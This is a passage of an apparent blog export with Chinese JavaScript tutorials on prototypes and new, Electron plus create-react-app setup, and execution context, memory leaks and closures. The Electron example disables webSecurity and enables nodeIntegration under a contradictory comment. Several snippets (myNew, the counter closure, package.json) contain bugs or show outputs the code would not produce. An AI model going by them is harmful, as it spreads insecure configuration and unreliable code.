属性，这个属性是一个指针，指向一个对象。原型对象的好处是，可以让每<br>个实例都有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度地节省了内存。</p><p><br></p><h4 id="1-1-prototype-vs-proto"><a href="#1-1-prototype-vs-proto" class="headerlink" title="1.1 prototype vs __proto"></a>1.1 <code>prototype</code> vs <code>__proto</code></h4><p>一个对象 A 的<code>__proto__</code>属性指向对象 B,那么 B 就是 A 的原型对象（或者叫父对象）。对象 A 可以对象 B 中的属性和方法，同时也可以使用对象 B 的原型对象 C 上的属性和方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Parent(<span class="string">'张三'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Parent.prototype); <span class="comment">// Parent &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.prototype); <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(Parent.__proto__); <span class="comment">// [Function], Parent是Function的实例</span></span><br><span class="line"><span class="built_in">console</span>.log(p.__proto__); <span class="comment">// Parent &#123;&#125; 执行Parent的原型</span></span><br></pre></td></tr></table></figure><p><code>__proto</code>指向对象的原型对象（父对象）。<br><code>prototype</code>用于创建经典的构造函数。prototyep 是在 new 创建对象时用来构建<strong>proto</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-实现面向对象"><a href="#2-实现面向对象" class="headerlink" title="2. 实现面向对象"></a>2. 实现面向对象</h3><h4 id="1-Function，object，-class"><a href="#1-Function，object，-class" class="headerlink" title="1. Function，object， class"></a>1. Function，object， class</h4><p>Function 可以当做 Object 的构造函数，new 一个 Function 时，会返回一个对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Parent(<span class="string">'张三'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(Parent.prototype); <span class="comment">// Parent &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.prototype); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>构造函数本身是一个 Function， 而构造函数返回的实例是一个 Object。构造函数 Function 有 prototype 属性，而实例 Object 没有 prototype 属性。</p><p><br></p><h3 id="3-new"><a href="#3-new" class="headerlink" title="3. new"></a>3. new</h3><h4 id="3-1-new是什么？"><a href="#3-1-new是什么？" class="headerlink" title="3.1 new是什么？"></a>3.1 new是什么？</h4><p><code>new</code>运算符创建一个用户定义的对象类型的实例或具有构造函数的内置对象的实例。</p><ul><li>new通过Person创建出来的实例可以访问到构造函数中的属性</li><li>new通过Person创建出来的实例可以访问到构造函数原型链上的方法和属性</li><li><p>在构造函数内加上返回值：</p><ul><li>返回基本数据类型时，会被忽略</li><li>返回引用数据类型时，会返回返回值</li><li>没有返回值，返回this</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> man = <span class="keyword">new</span> Person(<span class="string">'xl'</span>,<span class="number">20</span>)</span><br><span class="line"><span class="built_in">console</span>.log(man) <span class="comment">// Person &#123; name: 'xl', age: 20 &#125;</span></span><br><span class="line">man.sayName() <span class="comment">// 'xl'</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-new-Function-做了什么？"><a href="#3-2-new-Function-做了什么？" class="headerlink" title="3.2 new Function 做了什么？"></a>3.2 new Function 做了什么？</h4><ul><li>新建一个新的空对象<code>{}</code></li><li>把新对象<code>[[prototype]]</code>指向<code>Person.prototype</code></li><li>将Person构造函数的this设置为新建的对象，执行</li><li>构造函数Person没有return语句，则将该新创建的对象返回</li></ul><p><img src="/2019/08/07/JS原型链/1.jpg" style="width:500px"></p><p><br></p><h4 id="3-3-new-Class-做了什么？"><a href="#3-3-new-Class-做了什么？" class="headerlink" title="3.3 new Class 做了什么？"></a>3.3 new Class 做了什么？</h4><h4 id="3-4-实现一个new"><a href="#3-4-实现一个new" class="headerlink" title="3.4 实现一个new"></a>3.4 实现一个new</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNew</span> (<span class="params">func, ...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> obj = <span class="built_in">Object</span>.create(func.prototype)</span><br><span class="line">  <span class="keyword">let</span> result = func.apply(obj, ...args)</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">instanceof</span> <span class="built_in">Object</span> ? result : obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = myNew(Person, <span class="string">"huihui"</span>, <span class="number">123</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p) <span class="comment">// Person &#123;name: "huihui", age: 123&#125;</span></span><br><span class="line">p.sayName() <span class="comment">// huihui</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-实现继承"><a href="#4-实现继承" class="headerlink" title="4. 实现继承"></a>4. 实现继承</h3><p>ES5,ES6 实现继承<br>继承的类型<br>Class 用法，用 ES5 实现一个 Class</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/6991483397495324703?share_token=22e1f417-433c-45b5-af4a-36379e2a189a" target="_blank" rel="noopener">说说new操作符具体干了什么？</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Electron + creact-react-app + ant-design搭建项目</title>
      <link href="/2019/08/05/electron%E6%90%AD%E5%BB%BAReact-app/"/>
      <url>/2019/08/05/electron%E6%90%AD%E5%BB%BAReact-app/</url>
      <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Electron可以简单地理解为</span><br><span class="line">Electron = nodejs + chrome内核</span><br></pre></td></tr></table></figure><p>因为内置chrome内核，所以开发者可以用html/css/js来构建页面，这一部分运行在<em>渲染进程</em>中。<br>因为内置nodejs环境，所以可以访问计算机本地的资源：读写磁盘文件、创建进程、本地通知，这一部分运行在<em>主进程</em>中。</p><p><br></p><h3 id="1-搭建应用"><a href="#1-搭建应用" class="headerlink" title="1. 搭建应用"></a>1. 搭建应用</h3><p>目标：搭建一个Electron + create-react-app + dva + react-router + antd的应用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 使用create-react-app脚手架</span><br><span class="line">create-react-app my-app</span><br><span class="line">cd my-app</span><br><span class="line">npm start</span><br><span class="line">npm run eject</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装electron</span><br><span class="line">npm install electron --save</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 修改pakcage.json</span><br><span class="line">"main": "public/electron.js",</span><br><span class="line">"homepage": ".",</span><br><span class="line">"scripts": &#123;</span><br><span class="line">  "electron-dev": "ELECTRON_START_URL=http://localhost:3000 electron ."</span><br><span class="line">  "electron": "electron .",</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-添加electron启动文件"><a href="#2-添加electron启动文件" class="headerlink" title="2. 添加electron启动文件"></a>2. 添加electron启动文件</h3><p>创建electron启动文件<code>/public/electron.js</code>，有两点修改：</p><ul><li>定义开发环境下<code>mainWindow.loadURL(&#39;http://localhost:3000&#39;)</code>,发布环境下则加载 <code>build/index.html</code> 文件。</li><li>定义<code>new BrowserWindow</code>的<code>webPreferences</code>属性，指定预加载的js文件(<code>./public/renderer.js</code>)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modules to control application life and create native browser window</span></span><br><span class="line"><span class="keyword">const</span> &#123;app, BrowserWindow, ipcMain, dialog &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">const</span> pkg = <span class="built_in">require</span>(<span class="string">'./package.json'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep a global reference of the window object, if you don't, the window will</span></span><br><span class="line"><span class="comment">// be closed automatically when the JavaScript object is garbage collected.</span></span><br><span class="line"><span class="keyword">let</span> mainWindow</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Create the browser window.</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width: <span class="number">800</span>, </span><br><span class="line">    height: <span class="number">600</span>,</span><br><span class="line">    autoHideMenuBar: <span class="literal">true</span>,</span><br><span class="line">    fullscreenable: <span class="literal">false</span>,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">        javascript: <span class="literal">true</span>,</span><br><span class="line">        plugins: <span class="literal">true</span>,</span><br><span class="line">        nodeIntegration: <span class="literal">true</span>, <span class="comment">// 不集成 Nodejs</span></span><br><span class="line">        webSecurity: <span class="literal">false</span>,</span><br><span class="line">        preload: path.join(__dirname, <span class="string">'./public/renderer.js'</span>) </span><br><span class="line">        <span class="comment">// 但预加载的 js 文件内仍可以使用 Nodejs 的 API</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and load the index.html of the app.</span></span><br><span class="line">  <span class="comment">// 这里要注意一下，这里是让浏览器窗口加载网页。</span></span><br><span class="line">  <span class="comment">// 如果是开发环境，则url为http://localhost:3000（package.json中配置）</span></span><br><span class="line">  <span class="comment">// 如果是生产环境，则url为build/index.html</span></span><br><span class="line">  <span class="keyword">const</span> startUrl = process.env.ELECTRON_START_URL || url.format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">true</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 加载网页之后，会创建`渲染进程`</span></span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the DevTools.</span></span><br><span class="line">  mainWindow.webContents.openDevTools()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Emitted when the window is closed.</span></span><br><span class="line">  mainWindow.on(<span class="string">'closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Dereference the window object, usually you would store windows</span></span><br><span class="line">    <span class="comment">// in an array if your app supports multi windows, this is the time</span></span><br><span class="line">    <span class="comment">// when you should delete the corresponding element.</span></span><br><span class="line">    mainWindow = <span class="literal">null</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This method will be called when Electron has finished</span></span><br><span class="line"><span class="comment">// initialization and is ready to create browser windows.</span></span><br><span class="line"><span class="comment">// Some APIs can only be used after this event occurs.</span></span><br><span class="line">app.on(<span class="string">'ready'</span>, createWindow)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quit when all windows are closed.</span></span><br><span class="line">app.on(<span class="string">'window-all-closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// On OS X it is common for applications and their menu bar</span></span><br><span class="line">  <span class="comment">// to stay active until the user quits explicitly with Cmd + Q</span></span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) &#123;</span><br><span class="line">    app.quit()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.on(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// On OS X it's common to re-create a window in the app when the</span></span><br><span class="line">  <span class="comment">// dock icon is clicked and there are no other windows open.</span></span><br><span class="line">  <span class="keyword">if</span> (mainWindow === <span class="literal">null</span>) &#123;</span><br><span class="line">    createWindow()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// In this file you can include the rest of your app's specific main process</span></span><br><span class="line"><span class="comment">// code. You can also put them in separate files and require them here.</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-调试运行"><a href="#3-调试运行" class="headerlink" title="3. 调试运行"></a>3. 调试运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 本地运行，运行electron，</span><br><span class="line">npm run start</span><br><span class="line">npm run electron-dev</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 生产环境运行</span><br><span class="line">npm run build</span><br><span class="line">npm run electron</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-在React-App里调用electron-API"><a href="#4-在React-App里调用electron-API" class="headerlink" title="4. 在React App里调用electron API"></a>4. 在React App里调用electron API</h3><p>所有Electron的API都会被指派给一种进程类型。许多API只能被用于主进程或渲染进程，但有一些可以同时在上述两种进程中使用。</p><ul><li><p>新建 <code>/public/renderer.js</code> 文件，该文件在electron入口文件里定义为预加载文件。通过require的方式获取electron及其他API，暴露electron API</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> electron = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三方Electron api</span></span><br><span class="line"><span class="keyword">var</span> ZegoLiveRoom = <span class="built_in">require</span>(<span class="string">"zegoliveroom/ZegoLiveRoom.js"</span>);</span><br><span class="line"><span class="keyword">var</span> ZEGOCONSTANTS = <span class="built_in">require</span>(<span class="string">"zegoliveroom/ZegoConstant.js"</span>);</span><br><span class="line"><span class="keyword">var</span> zegoClient = <span class="keyword">new</span> ZegoLiveRoom();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  zegoClient.initSDK(config)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global.zego = &#123;</span><br><span class="line">  init,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在React中调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/App.js</span></span><br><span class="line"><span class="keyword">const</span> electron = <span class="built_in">window</span>.electron;</span><br><span class="line"><span class="keyword">const</span> zego = <span class="built_in">window</span>.zego;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>()</span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    zego.init()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hell<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.jianshu.com/p/5e41663825c6" target="_blank" rel="noopener">使用create-react-app编写Electron app</a></li><li><a href="https://www.jianshu.com/p/96327b044e85" target="_blank" rel="noopener">Electron 无边框窗口的拖动</a></li><li><a href="https://www.jianshu.com/p/0387bd0f8a70" target="_blank" rel="noopener">Electron中BrowserWindow对象的所有可设置项</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS this，执行上下文，作用域</title>
      <link href="/2019/07/29/JS-this/"/>
      <url>/2019/07/29/JS-this/</url>
      <content type="html"><![CDATA[<h3 id="1-执行上下文"><a href="#1-执行上下文" class="headerlink" title="1. 执行上下文"></a>1. 执行上下文</h3><p>每当Javascript代码在运行的时候，它都是在执行上下文中运行。js中有三种执行上下文</p><ul><li><p>全局执行上下文<br>任何不在函数内部的代码都在全局上下文中。它会执行两件事：创建一个全局的window对象，并且设置<code>this</code>的值等于这个全局对象。一个程序中只会有一个全局执行上下文。</p></li><li><p>函数执行上下文<br>每当一个函数被调用时，都会为该函数创建一个新的上下文。</p></li><li><p>eval函数执行上下文<br>执行在eval函数内部的代码会有它属于自己的执行上下文。</p></li></ul><p><br></p><h4 id="1-1-创建执行上下文"><a href="#1-1-创建执行上下文" class="headerlink" title="1.1 创建执行上下文"></a>1.1 创建执行上下文</h4><p>创建执行上下文时，会</p><ul><li>初始化作用域链</li><li><p>创建变量对象 —— 创建arguments， 扫描函数声明，扫描变量声明<br>词法环境是一种持有标识符 —— 变量映射的结构。它内部有两个组件：</p><ul><li>环境记录器，函数内部定义的变量将被存储在环境记录器中。</li><li>外部环境的引用，它可以访问的父词法环境（作用域）。会是全局环境，以及任何包含此内部函数的外部函数。</li></ul></li><li><p>决定this的值。<br>在全局执行上下文中，<code>this</code>的值指向全局对象。在函数执行上下文中，<code>this</code>的值取决于该函数是如何别调用的。如果它被一个引用对象调用，那么<code>this</code>会被设置成那个对象，否则<code>this</code>的值别设置为全局对象或<code>undefined</code>(严格模式下)</p></li></ul><p><br></p><h4 id="1-2-压入执行栈"><a href="#1-2-压入执行栈" class="headerlink" title="1.2 压入执行栈"></a>1.2 压入执行栈</h4><p>创建后的执行上下文，会被压入执行栈。<em>执行栈</em> 是一种用于LIFO（后进先出）数据结构的栈，被用来存储代码运行时创建的所有执行上下文。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">first</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Inside first function'</span>);</span><br><span class="line">  second();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Again inside first function'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">second</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Inside second function'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Inside Global Execution Context'</span>);</span><br></pre></td></tr></table></figure></p><p>当JS引擎第一次遇到脚本时，它会创建一个全局的执行上下文并且压入当前执行栈。当遇到<code>first()</code>函数调用时，JS引擎为该函数创建一个新的执行上下文并把它压入当前执行栈的顶部。</p><p>当从<code>first()</code>函数内部调用<code>second()</code>，JS引擎为<code>second()</code>函数创建了一个新的执行上下文并把它压入当前执行栈的顶部。当<code>second()</code>执行完毕，它的执行上下文会从当前栈弹出，并且控制流程到达下一个执行上下文。</p><p><img src="/2019/07/29/JS-this/1.png"></p><p><br><br><br></p><p><br></p><h4 id="1-3-内存泄露"><a href="#1-3-内存泄露" class="headerlink" title="1.3 内存泄露"></a>1.3 内存泄露</h4><p>这些不再被需要的内存，由于某种原因，无法被释放，就是内存泄露。常见的内存泄露案例</p><ul><li>意外的全局变量</li><li>被遗忘的计时器或回调函数</li><li>DOM引用</li><li>闭包</li></ul><h5 id="1-3-1-意外创建全局变量"><a href="#1-3-1-意外创建全局变量" class="headerlink" title="1.3.1 意外创建全局变量"></a>1.3.1 意外创建全局变量</h5><p>this被指向了全局变量window，意外地创建了全局变量。还有一些明确定义的全局变量，用来暂存大量数据，记得在使用后，对其重新赋值为null。或在javascript文件头部加上<em><code>use strict</code></em>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'123'</span></span><br><span class="line">  <span class="comment">// name = '123'</span></span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line"><span class="built_in">console</span>.log(name);  <span class="comment">// "123"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-3-2-未销毁的定时器"><a href="#1-3-2-未销毁的定时器" class="headerlink" title="1.3.2 未销毁的定时器"></a>1.3.2 未销毁的定时器</h5><p>没有回收定时器，整个定时器依然有效，不但定时器无法被内存回收，定时器函数的依赖也无法回收。</p><p><br></p><h5 id="1-3-3-DOM引用"><a href="#1-3-3-DOM引用" class="headerlink" title="1.3.3 DOM引用"></a>1.3.3 DOM引用</h5><p>当删除button的DOM节点时，变量button仍保存在内存中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'myBtn'</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  btn.innerHTML = <span class="string">'hello'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.body.removeChild(btn);</span><br><span class="line">btn = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-3-4-闭包"><a href="#1-3-4-闭包" class="headerlink" title="1.3.4 闭包"></a>1.3.4 闭包</h5><p><strong>闭包</strong>是指读取了其他函数内部变量的函数。创建闭包的常见方式，就是在一个函数内部创建另一个函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">object1, object2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = object1[propertyName];</span><br><span class="line">    <span class="keyword">var</span> value2 = object2[propertyName];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value1 - value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>模拟私有方法</em><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> makeCounter = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    privateCounte += val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      change(<span class="number">1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    decrement: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      change(<span class="number">-1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> privateCounter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"><span class="keyword">var</span> counter1 = makeCounter();</span><br><span class="line">counter1.increment();</span><br><span class="line"><span 